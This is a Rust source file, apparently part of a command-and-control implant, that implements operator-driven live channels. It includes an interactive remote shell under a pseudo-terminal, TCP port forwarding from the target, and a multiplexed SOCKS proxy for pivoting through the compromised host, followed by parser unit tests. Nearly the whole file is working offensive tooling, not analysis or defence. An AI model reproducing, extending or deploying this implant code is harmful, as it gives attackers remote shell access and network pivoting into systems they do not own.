use std::collections::{BTreeMap, HashMap, HashSet};
use std::io::{Read, Write};
use std::net::{Shutdown, TcpStream};
use std::process::{ChildStdin, Command, Stdio};
use std::sync::atomic::{AtomicBool, AtomicU64, Ordering};
use std::sync::mpsc::{Receiver, RecvTimeoutError, Sender};
use std::sync::{Arc, Mutex};
use std::time::Duration;

use crate::handlers::Outcome;

// The channel layer (architecture.md Sec 10.3, the streaming task shape):
// the implant half of the verbs whose tasks run as live channels rather
// than one-shot round trips. A channel task is dispatched like any other --
// the same signed TaskRequest, the same acceptance -- but its TaskRequest
// opens a channel instead of a completion: whatever the channel produces
// streams back as ChannelOutput frames, operator input arrives as
// ChannelInput frames the run loop routes here, and the final TaskResult
// comes when the channel's underlying thing ends.
//
// The shape is thread-per-concern over one event queue: every channel owns
// a control thread that applies operator input to the writable end, and one
// or more pump threads that read the readable ends and hand the run loop
// events through a shared mpsc. The run loop owns the queue's drain -- at
// the poll cycle's edges on a poll bake, on short socket ticks on a stream
// bake -- so no pump ever touches a carriage and the wire stays the
// session's single writer.

/// One chunk of channel output: the largest payload one ChannelOutput frame
/// carries, the budget the shell's stdio pump and the tunnel's socket pump
/// share (well inside the frame-layer sizing budget with protobuf overhead
/// to spare).
const CHUNK_BYTES: usize = 16 * 1024;

/// How long an outbound dial may take before the connection is refused: a
/// blackholed destination must fail its connection, not park the tunnel.
const CONNECT_TIMEOUT: Duration = Duration::from_secs(10);

/// The shell's idle self-close window: an abandoned channel must not hold a
/// live shell open on the target indefinitely. The window counts operator
/// input, not output -- an operator watching a long printout types nothing
/// for minutes at a time, and their session must survive it.
const DEFAULT_IDLE_WINDOW: Duration = Duration::from_secs(600);

/// The channel verbs: the tasks that open live channels rather than one-shot
/// round trips. The mirror of the server's ChannelVerbs table.
pub fn is_channel_verb(verb: &str) -> bool {
    matches!(verb, "shell.interact" | "tunnel.forward" | "tunnel.socks")
}

/// What a live channel's pumps hand the run loop.
pub enum Event {
    /// One chunk of the channel's output, upstream as a ChannelOutput frame.
    Output { task: String, data: Vec<u8> },
    /// The channel's underlying thing ended; this becomes the task's final
    /// TaskResult.
    Finished {
        task: String,
        outcome: Outcome,
        output: String,
    },
}

/// What the run loop hands a live channel's control thread.
enum Control {
    /// Operator bytes off a ChannelInput frame.
    Input(Vec<u8>),
    /// The operator closed the channel's stdin.
    Eof,
    /// The beacon stream that carried the task died; the channel dies with
    /// it, and its result never comes (the wire contract's session-scoped
    /// lifetime).
    Reap,
}

/// The registry of live channels: the run loop's single handle for the
/// whole layer. Spawn routes a channel task to its verb's machinery; feed
/// routes operator input; the run loop drains events into the batch; reap
/// is the stream-drop discipline.
pub struct Channels {
    controls: HashMap<String, Sender<Control>>,
    events: Receiver<Event>,
    sink: Sender<Event>,
    /// Tasks killed by a stream drop. Their pumps' last words keep arriving
    /// after the reap -- a final Finished most of all -- and the wire
    /// contract says that result never comes, so the drain drops them here.
    reaped: HashSet<String>,
}

impl Channels {
    pub fn new() -> Channels {
        let (sink, events) = std::sync::mpsc::channel();
        Channels {
            controls: HashMap::new(),
            events,
            sink,
            reaped: HashSet::new(),
        }
    }

    pub fn holds(&self, task: &str) -> bool {
        self.controls.contains_key(task)
    }

    pub fn any_live(&self) -> bool {
        !self.controls.is_empty()
    }

    /// Opens the channel a dispatched channel task names. Registration
    /// precedes the machinery, so input racing the spawn queues in the
    /// control channel and is applied when the writer starts.
    pub fn spawn(&mut self, verb: &str, task: &str, arguments: &str) {
        let (control, inbox) = std::sync::mpsc::channel::<Control>();
        self.controls.insert(task.to_string(), control);
        let task = task.to_string();
        let arguments = arguments.to_string();
        match verb {
            "shell.interact" => self.spawn_shell(task, arguments, inbox),
            "tunnel.forward" => self.spawn_forward(task, arguments, inbox),
            _ => self.spawn_socks(task, inbox),
        }
    }

    /// Routes one ChannelInput frame's payload. A task with no live channel
    /// is dropped -- the server only routes input to channels it dispatched,
    /// so this is at most a race with the channel's own completion.
    pub fn feed(&self, task: &str, data: Vec<u8>, eof: bool) {
        let Some(control) = self.controls.get(task) else {
            return;
        };
        if !data.is_empty() {
            let _ = control.send(Control::Input(data));
        }
        if eof {
            let _ = control.send(Control::Eof);
        }
    }

    /// The next undropped event off the queue, if any. Events for reaped
    /// tasks are discarded here -- the reap killed them, and their results
    /// must never reach the wire.
    pub fn next_event(&self) -> Option<Event> {
        while let Ok(event) = self.events.try_recv() {
            let reaped = match &event {
                Event::Output { task, .. } | Event::Finished { task, .. } => {
                    self.reaped.contains(task)
                }
            };
            if !reaped {
                return Some(event);
            }
        }
        None
    }

    /// The stream-drop discipline: every channel the dying stream carried is
    /// killed, and their final words are dropped at the drain. The kill is
    /// advisory through the control channel -- a thread that already ended
    /// needs no telling -- and dropping the senders disconnects the rest.
    pub fn reap(&mut self) {
        for (task, control) in std::mem::take(&mut self.controls) {
            self.reaped.insert(task);
            let _ = control.send(Control::Reap);
        }
    }

    fn spawn_shell(&self, task: String, arguments: String, inbox: Receiver<Control>) {
        let events = self.sink.clone();
        let Some(mut child) = spawn_platform_shell() else {
            let _ = events.send(Event::Finished {
                task,
                outcome: Outcome::Failed,
                output: "failed to start shell".into(),
            });
            return;
        };
        let pid = child.id();
        let stdin = child.stdin.take();
        let stdout = child.stdout.take();
        let stderr = child.stderr.take();
        let window = shell_idle_window();

        // The stderr pump drains the shell's complaints onto the transcript
        // until the pipe's EOF, which follows process exit.
        let stderr_pump = std::thread::spawn({
            let events = events.clone();
            let task = task.clone();
            move || pump_read_half(stderr, events, task)
        });

        // The completion strand: stdout's EOF means the shell is finishing;
        // wait() settles its status, the stderr pump is joined so its tail
        // lands on the transcript before the closing result, and the channel
        // reports like any one-shot task.
        let idle_closed = Arc::new(AtomicBool::new(false));
        let closed_flag = Arc::clone(&idle_closed);
        std::thread::spawn(move || {
            pump_read_half(stdout, events.clone(), task.clone());
            let code = child.wait().ok().and_then(|status| status.code());
            let _ = stderr_pump.join();
            let (outcome, output) = if closed_flag.load(Ordering::SeqCst) {
                (Outcome::Succeeded, idle_summary(window))
            } else {
                match code {
                    Some(0) => (Outcome::Succeeded, "shell exited".into()),
                    Some(code) => (Outcome::Failed, format!("shell exited with code {code}")),
                    None => (Outcome::Failed, "shell exited without a status".into()),
                }
            };
            let _ = events.send(Event::Finished {
                task,
                outcome,
                output,
            });
        });

        // The input strand: operator bytes onto the shell's stdin. The idle
        // window lives here because this thread is the one that sees -- or
        // stops seeing -- the operator.
        std::thread::spawn(move || {
            write_shell_input(stdin, pid, inbox, idle_closed, arguments, window)
        });
    }

    fn spawn_forward(&self, task: String, arguments: String, inbox: Receiver<Control>) {
        let events = self.sink.clone();
        std::thread::spawn(move || {
            let Some((host, port)) = parse_forward_args(&arguments) else {
                let _ = events.send(Event::Finished {
                    task,
                    outcome: Outcome::Failed,
                    output: "tunnel.forward expects '<host> <port>'".into(),
                });
                return;
            };
            let socket = match dial(&host, port) {
                Ok(socket) => Arc::new(socket),
                Err(cause) => {
                    let _ = events.send(Event::Finished {
                        task,
                        outcome: Outcome::Failed,
                        output: format!("connect to {host}:{port} failed: {cause}"),
                    });
                    return;
                }
            };

            // The operator's bytes onto the socket; eof is the TCP shape of
            // the operator's stdin ending -- a half-close, with the peer's
            // answers still free to land.
            let up = Arc::new(AtomicU64::new(0));
            std::thread::spawn({
                let socket = Arc::clone(&socket);
                let up = Arc::clone(&up);
                move || forward_writer(socket, inbox, up)
            });

            // The peer's answers upstream; the peer's close is the tunnel's
            // natural end.
            let mut down: u64 = 0;
            let mut buffer = vec![0u8; CHUNK_BYTES];
            loop {
                let read = match (&*socket).read(&mut buffer) {
                    Ok(0) | Err(_) => break,
                    Ok(read) => read,
                };
                down += read as u64;
                if events
                    .send(Event::Output {
                        task: task.clone(),
                        data: buffer[..read].to_vec(),
                    })
                    .is_err()
                {
                    return; // nobody drains: the run is over
                }
            }
            let _ = socket.shutdown(Shutdown::Both);
            let _ = events.send(Event::Finished {
                task,
                outcome: Outcome::Succeeded,
                output: format!(
                    "tunnel to {host}:{port} closed: relayed {} bytes up, {down} bytes down",
                    up.load(Ordering::Relaxed)
                ),
            });
        });
    }

    fn spawn_socks(&self, task: String, inbox: Receiver<Control>) {
        let events = self.sink.clone();
        std::thread::spawn(move || run_socks(task, inbox, events));
    }
}

// --- shell.interact ---------------------------------------------------------

/// The platform shell, under a pseudo-terminal where one exists: util-linux
/// `script -qec <shell> /dev/null` allocates a pty, so the channel behaves
/// like a real terminal -- the shell prints its prompt, line editing works,
/// and the interrupt byte becomes SIGINT for the foreground program. Where
/// `script` is missing (a stripped container) or the platform has no
/// equivalent (Windows would want ConPTY), the plain pipes shape still
/// talks to the shell, just without terminal semantics.
fn spawn_platform_shell() -> Option<std::process::Child> {
    let shell = if cfg!(windows) { "cmd" } else { "sh" };
    let piped = |mut command: Command| {
        command
            .stdin(Stdio::piped())
            .stdout(Stdio::piped())
            .stderr(Stdio::piped());
        command
    };
    let mut wrapped = Command::new("script");
    if cfg!(target_os = "linux") {
        wrapped.args(["-qec", shell, "/dev/null"]);
    } else if cfg!(target_os = "macos") {
        wrapped.args(["-q", "/dev/null", shell]);
    } else {
        wrapped = Command::new(shell);
    }
    if wrapped.get_program() == "script" {
        if let Ok(child) = piped(wrapped).spawn() {
            return Some(child);
        }
    }
    piped(Command::new(shell)).spawn().ok()
}

/// The idle self-close window, `ROD_SHELL_IDLE_SECONDS` overridable for lab
/// runs.
fn shell_idle_window() -> Duration {
    std::env::var("ROD_SHELL_IDLE_SECONDS")
        .ok()
        .and_then(|raw| raw.parse::<u64>().ok())
        .filter(|seconds| *seconds > 0)
        .map(Duration::from_secs)
        .unwrap_or(DEFAULT_IDLE_WINDOW)
}

fn idle_summary(window: Duration) -> String {
    let minutes = window.as_secs_f64() / 60.0;
    let shaped = if (minutes - minutes.round()).abs() < f64::EPSILON {
        format!("{}", minutes as u64)
    } else {
        format!("{minutes:.1}")
    };
    format!("shell closed after {shaped} minutes without input")
}

/// The shell's input strand: applies operator bytes to stdin until the
/// channel ends. Eof drops stdin -- the shell reads its own EOF and exits,
/// ending the channel naturally. Silence past the idle window kills the
/// process instead: an abandoned session must not hold a live shell.
fn write_shell_input(
    mut stdin: Option<ChildStdin>,
    pid: u32,
    inbox: Receiver<Control>,
    idle_closed: Arc<AtomicBool>,
    initial: String,
    window: Duration,
) {
    if !initial.trim().is_empty() {
        if let Some(stream) = stdin.as_mut() {
            let _ = stream.write_all(format!("{initial}\n").as_bytes());
            let _ = stream.flush();
        }
    }
    loop {
        match inbox.recv_timeout(window) {
            Ok(Control::Input(bytes)) => {
                let Some(stream) = stdin.as_mut() else { return };
                if stream
                    .write_all(&bytes)
                    .and_then(|()| stream.flush())
                    .is_err()
                {
                    return; // the shell is gone; its exit finishes the task
                }
            }
            Ok(Control::Eof) => {
                stdin.take(); // the pipe's drop is the shell's EOF
                return;
            }
            Ok(Control::Reap) => {
                kill_process(pid);
                return;
            }
            Err(RecvTimeoutError::Timeout) => {
                idle_closed.store(true, Ordering::SeqCst);
                kill_process(pid);
                return;
            }
            Err(RecvTimeoutError::Disconnected) => return,
        }
    }
}

/// One readable end of a channel's underlying thing: every read is one
/// output chunk. The await on the event send is the backpressure -- a run
/// loop that cannot keep up slows the pump, so the pipe's own buffer is the
/// only buffering.
fn pump_read_half<R: Read + Send + 'static>(
    source: Option<R>,
    events: Sender<Event>,
    task: String,
) {
    let Some(mut source) = source else { return };
    let mut buffer = vec![0u8; CHUNK_BYTES];
    loop {
        match source.read(&mut buffer) {
            Ok(0) | Err(_) => return, // EOF or a faulted pipe: the channel's end owns the reporting
            Ok(read) => {
                if events
                    .send(Event::Output {
                        task: task.clone(),
                        data: buffer[..read].to_vec(),
                    })
                    .is_err()
                {
                    return; // nobody drains: the run is over
                }
            }
        }
    }
}

#[cfg(unix)]
fn kill_process(pid: u32) {
    // The kill is deliberate: an idle session's shell or a reaped channel's
    // child must not outlive the task that owns it.
    unsafe {
        libc::kill(pid as i32, libc::SIGKILL);
    }
}

#[cfg(windows)]
fn kill_process(pid: u32) {
    unsafe {
        use windows_sys::Win32::Foundation::CloseHandle;
        use windows_sys::Win32::System::Threading::{
            OpenProcess, TerminateProcess, PROCESS_TERMINATE,
        };
        let process = OpenProcess(PROCESS_TERMINATE, 0, pid);
        if !process.is_null() {
            TerminateProcess(process, 1);
            CloseHandle(process);
        }
    }
}

// --- tunnel.forward ---------------------------------------------------------

fn parse_forward_args(arguments: &str) -> Option<(String, u16)> {
    let mut tokens = arguments.split_whitespace();
    let host = tokens.next()?.to_string();
    let port: u16 = tokens.next()?.parse().ok()?;
    if host.is_empty() || port == 0 || tokens.next().is_some() {
        return None;
    }
    Some((host, port))
}

fn forward_writer(socket: Arc<TcpStream>, inbox: Receiver<Control>, up: Arc<AtomicU64>) {
    loop {
        match inbox.recv() {
            Ok(Control::Input(bytes)) => {
                if (&*socket).write_all(&bytes).is_err() {
                    let _ = socket.shutdown(Shutdown::Both); // the peer is gone; the reader ends the tunnel
                    return;
                }
                up.fetch_add(bytes.len() as u64, Ordering::Relaxed);
            }
            Ok(Control::Eof) => {
                let _ = socket.shutdown(Shutdown::Write); // half-close: answers in flight still land
                return;
            }
            Ok(Control::Reap) => {
                let _ = socket.shutdown(Shutdown::Both);
                return;
            }
            Err(_) => return,
        }
    }
}

/// Resolves and dials `host:port` under the connect deadline, trying every
/// resolved address before giving up.
fn dial(host: &str, port: u16) -> Result<TcpStream, String> {
    use std::net::ToSocketAddrs;
    let addresses = (host, port)
        .to_socket_addrs()
        .map_err(|cause| format!("resolve {host}: {cause}"))?;
    let mut last = format!("no address answered for {host}:{port}");
    for address in addresses {
        match TcpStream::connect_timeout(&address, CONNECT_TIMEOUT) {
            Ok(socket) => return Ok(socket),
            Err(cause) => last = cause.to_string(),
        }
    }
    Err(last)
}

// --- tunnel.socks -----------------------------------------------------------

// The channel's byte stream is the proxy's own connection-multiplexed
// grammar, carried entirely inside the opaque channel bytes (the escape
// hatch is per-verb, and a channel's byte stream is its verb's grammar):
//
//     packet := kind(1) connection(4, LE) length(2, LE) payload(length)
//     open   (1): payload := port(2, LE) host-length(1) host-bytes
//     data   (2): payload := the proxied bytes, at most 16384
//     close  (3): payload empty -- the connection ended
//     opened (4): payload := status(1) -- 0 connected, otherwise refused
//
// The operator side (a SOCKS listener bound onto the dispatched channel)
// allocates the connection ids; this half echoes them.

const PACKET_OPEN: u8 = 1;
const PACKET_DATA: u8 = 2;
const PACKET_CLOSE: u8 = 3;
const PACKET_OPENED: u8 = 4;

struct Packet {
    kind: u8,
    id: u32,
    payload: Vec<u8>,
}

fn encode_packet(kind: u8, id: u32, payload: &[u8]) -> Vec<u8> {
    let mut packet = Vec::with_capacity(7 + payload.len());
    packet.push(kind);
    packet.extend_from_slice(&id.to_le_bytes());
    packet.extend_from_slice(&(payload.len() as u16).to_le_bytes());
    packet.extend_from_slice(payload);
    packet
}

/// Reframes the channel's raw input bytes into whole packets. The receiver
/// concatenates chunks without regard for framing (the channel contract),
/// so this holds the unparsed remainder and extracts each complete packet
/// in arrival order. A packet with an unknown kind or an oversized length,
/// or a remainder that cannot be a legal stream, is malformed -- None --
/// and ends the proxy rather than corrupting a connection silently.
struct SocksParser {
    remainder: Vec<u8>,
}

impl SocksParser {
    fn append(&mut self, data: &[u8]) -> Option<Vec<Packet>> {
        const MAX_PACKET_BYTES: usize = CHUNK_BYTES;
        const MAX_REMAINDER_BYTES: usize = 1024 * 1024;

        self.remainder.extend_from_slice(data);
        if self.remainder.len() > MAX_REMAINDER_BYTES {
            return None;
        }
        let mut packets = Vec::new();
        let mut start = 0usize;
        while self.remainder.len() - start >= 7 {
            let kind = self.remainder[start];
            let id = u32::from_le_bytes(self.remainder[start + 1..start + 5].try_into().unwrap());
            let length =
                u16::from_le_bytes(self.remainder[start + 5..start + 7].try_into().unwrap())
                    as usize;
            if !matches!(kind, PACKET_OPEN..=PACKET_OPENED) || length > MAX_PACKET_BYTES {
                return None;
            }
            if self.remainder.len() - start < 7 + length {
                break; // the packet's tail is still in flight
            }
            packets.push(Packet {
                kind,
                id,
                payload: self.remainder[start + 7..start + 7 + length].to_vec(),
            });
            start += 7 + length;
        }
        self.remainder.drain(..start);
        Some(packets)
    }
}

struct SocksCounters {
    connected: AtomicU64,
    refused: AtomicU64,
    up: AtomicU64,
    down: AtomicU64,
}

/// One proxied connection's write half: a serialized send path fed by the
/// control thread, so a stalled target slows its own connection, not the
/// whole proxy.
struct SocksConnection {
    writer: Sender<Option<Vec<u8>>>,
    socket: Arc<TcpStream>,
}

struct Socks {
    task: String,
    events: Sender<Event>,
    connections: Mutex<HashMap<u32, SocksConnection>>,
    destinations: Mutex<BTreeMap<String, u32>>,
    counters: SocksCounters,
}

impl Socks {
    fn emit_packet(&self, kind: u8, id: u32, payload: &[u8]) -> bool {
        self.events
            .send(Event::Output {
                task: self.task.clone(),
                data: encode_packet(kind, id, payload),
            })
            .is_ok()
    }

    fn close_connection(&self, id: u32) {
        if let Some(connection) = self
            .connections
            .lock()
            .expect("socks connections")
            .remove(&id)
        {
            let _ = connection.writer.send(None);
            let _ = connection.socket.shutdown(Shutdown::Both);
        }
    }

    fn close_all(&self) {
        let ids: Vec<u32> = self
            .connections
            .lock()
            .expect("socks connections")
            .keys()
            .copied()
            .collect();
        for id in ids {
            self.close_connection(id);
        }
    }

    fn summary(&self) -> String {
        let mut text = format!(
            "socks proxy closed: {} connections ({} refused), {} bytes up, {} bytes down",
            self.counters.connected.load(Ordering::Relaxed),
            self.counters.refused.load(Ordering::Relaxed),
            self.counters.up.load(Ordering::Relaxed),
            self.counters.down.load(Ordering::Relaxed),
        );
        for (destination, times) in self.destinations.lock().expect("socks destinations").iter() {
            text.push_str("\n  ");
            text.push_str(destination);
            if *times > 1 {
                text.push_str(&format!(" x{times}"));
            }
        }
        text
    }
}

/// The proxy's control strand: re-frames the channel's input into packets
/// and dispatches them -- opens dial in their own threads so a slow
/// destination cannot park the grammar, data rides the target connection's
/// serialized send path, and the operator's eof closes every connection and
/// reports the proxy's summary.
fn run_socks(task: String, inbox: Receiver<Control>, events: Sender<Event>) {
    let socks = Arc::new(Socks {
        task: task.clone(),
        events: events.clone(),
        connections: Mutex::new(HashMap::new()),
        destinations: Mutex::new(BTreeMap::new()),
        counters: SocksCounters {
            connected: AtomicU64::new(0),
            refused: AtomicU64::new(0),
            up: AtomicU64::new(0),
            down: AtomicU64::new(0),
        },
    });
    let mut parser = SocksParser {
        remainder: Vec::new(),
    };
    loop {
        let input = match inbox.recv() {
            Ok(Control::Input(data)) => data,
            Ok(Control::Eof) => {
                socks.close_all();
                let _ = events.send(Event::Finished {
                    task,
                    outcome: Outcome::Succeeded,
                    output: socks.summary(),
                });
                return;
            }
            Ok(Control::Reap) => {
                socks.close_all();
                return; // the run loop drops this channel's last words
            }
            Err(_) => return,
        };
        let Some(packets) = parser.append(&input) else {
            socks.close_all();
            let _ = events.send(Event::Finished {
                task,
                outcome: Outcome::Failed,
                output: "socks channel closed: malformed packet stream".into(),
            });
            return;
        };
        for packet in packets {
            let healthy = match packet.kind {
                PACKET_OPEN => socks_open(Arc::clone(&socks), packet.id, &packet.payload),
                PACKET_DATA => {
                    socks
                        .counters
                        .up
                        .fetch_add(packet.payload.len() as u64, Ordering::Relaxed);
                    // Data for an ended connection is nothing to do; the
                    // reader that owned it already reported its close.
                    if let Some(connection) = socks
                        .connections
                        .lock()
                        .expect("socks connections")
                        .get(&packet.id)
                    {
                        let _ = connection.writer.send(Some(packet.payload));
                    }
                    true
                }
                PACKET_CLOSE => {
                    socks.close_connection(packet.id);
                    true
                }
                _ => false, // opened from the operator side: the ids are theirs to allocate
            };
            if !healthy {
                socks.close_all();
                let _ = events.send(Event::Finished {
                    task,
                    outcome: Outcome::Failed,
                    output: "socks channel closed: malformed packet stream".into(),
                });
                return;
            }
        }
    }
}

/// One open packet: parse the destination, dial it from this implant's
/// vantage in its own thread, and answer with the dial's result -- the
/// operator's SOCKS reply waits on it.
fn socks_open(socks: Arc<Socks>, id: u32, payload: &[u8]) -> bool {
    {
        let connections = socks.connections.lock().expect("socks connections");
        if connections.contains_key(&id) {
            return false; // ids are the operator side's to allocate; a repeat is malformed
        }
    }
    if payload.len() < 3 {
        return false;
    }
    let port = u16::from_le_bytes([payload[0], payload[1]]);
    let host_length = payload[2] as usize;
    if host_length == 0 || payload.len() < 3 + host_length {
        return false;
    }
    let host = String::from_utf8_lossy(&payload[3..3 + host_length]).into_owned();
    *socks
        .destinations
        .lock()
        .expect("socks destinations")
        .entry(format!("{host}:{port}"))
        .or_insert(0) += 1;

    std::thread::spawn(move || match dial(&host, port) {
        Ok(socket) => {
            socks.counters.connected.fetch_add(1, Ordering::Relaxed);
            let socket = Arc::new(socket);
            let (writer, send_side) = std::sync::mpsc::channel::<Option<Vec<u8>>>();
            socks.connections.lock().expect("socks connections").insert(
                id,
                SocksConnection {
                    writer,
                    socket: Arc::clone(&socket),
                },
            );
            socks.emit_packet(PACKET_OPENED, id, &[0]);
            std::thread::spawn({
                let socket = Arc::clone(&socket);
                move || socks_connection_writer(socket, send_side)
            });
            std::thread::spawn(move || socks_connection_reader(socks, socket, id));
        }
        Err(_) => {
            socks.counters.refused.fetch_add(1, Ordering::Relaxed);
            socks.emit_packet(PACKET_OPENED, id, &[1]);
        }
    });
    true
}

/// One connection's send path: bytes from the control strand onto the
/// target's socket, serialized per connection.
fn socks_connection_writer(socket: Arc<TcpStream>, inbox: Receiver<Option<Vec<u8>>>) {
    while let Ok(message) = inbox.recv() {
        let Some(bytes) = message else {
            let _ = socket.shutdown(Shutdown::Both);
            return;
        };
        if (&*socket).write_all(&bytes).is_err() {
            let _ = socket.shutdown(Shutdown::Both); // the target is gone; the reader reports
            return;
        }
    }
}

/// One connection's receive path: the target's answers upstream as data
/// packets, one read per packet. The target ending its side forgets the
/// connection and tells the operator side with a close packet.
fn socks_connection_reader(socks: Arc<Socks>, socket: Arc<TcpStream>, id: u32) {
    let mut buffer = vec![0u8; CHUNK_BYTES];
    loop {
        match (&*socket).read(&mut buffer) {
            Ok(0) | Err(_) => break,
            Ok(read) => {
                socks
                    .counters
                    .down
                    .fetch_add(read as u64, Ordering::Relaxed);
                if !socks.emit_packet(PACKET_DATA, id, &buffer[..read]) {
                    return; // nobody drains: the run is over
                }
            }
        }
    }
    socks.close_connection(id);
    socks.emit_packet(PACKET_CLOSE, id, &[]);
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn socks_parser_reframes_whole_packets() {
        let mut parser = SocksParser {
            remainder: Vec::new(),
        };
        let packets = parser
            .append(&encode_packet(
                PACKET_OPEN,
                7,
                &[
                    0x50, 0x1f, 9, b'l', b'o', b'c', b'a', b'l', b'h', b'o', b's', b't',
                ],
            ))
            .expect("a whole open packet parses");
        assert_eq!(packets.len(), 1);
        assert_eq!(packets[0].kind, PACKET_OPEN);
        assert_eq!(packets[0].id, 7);
        assert_eq!(packets[0].payload[0], 0x50);
    }

    #[test]
    fn socks_parser_reassembles_splits() {
        let mut parser = SocksParser {
            remainder: Vec::new(),
        };
        let whole = [
            encode_packet(PACKET_DATA, 1, b"ping"),
            encode_packet(PACKET_CLOSE, 1, &[]),
        ]
        .concat();
        let split = whole.len() / 2;
        assert!(parser
            .append(&whole[..split])
            .expect("a prefix parses")
            .is_empty());
        let rest = parser.append(&whole[split..]).expect("the suffix parses");
        assert_eq!(rest.len(), 2);
        assert_eq!(rest[0].kind, PACKET_DATA);
        assert_eq!(rest[1].kind, PACKET_CLOSE);
    }

    #[test]
    fn socks_parser_rejects_unknown_kinds() {
        let mut parser = SocksParser {
            remainder: Vec::new(),
        };
        assert!(parser.append(&encode_packet(9, 1, b"nope")).is_none());
    }
}
